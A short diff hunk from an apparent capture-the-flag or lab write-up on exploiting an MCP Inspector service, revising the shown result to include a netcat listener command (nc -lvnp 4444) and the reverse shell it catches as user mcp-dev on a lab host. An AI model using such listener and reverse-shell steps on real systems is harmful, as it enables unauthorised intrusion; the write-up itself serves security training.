@@ -793,13 +793,22 @@ curl -s -X POST http://10.129.245.216:6274/api/mcp/connect \
 **Result:**
 
 ```shell
-connect to [10.10.14.85] from (UNKNOWN) [10.129.245.216] 54870
-bash: cannot set terminal process group (1056): Inappropriate ioctl for device
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.85] from (UNKNOWN) [10.129.245.216] 38030
+bash: cannot set terminal process group (1078): Inappropriate ioctl for device
 bash: no job control in this shell
-mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
+mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ 
 ```
 
 Shell received as `mcp-dev` in the Inspector's working directory.
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
 
 ### 3.3 Initial Shell Enumeration
 
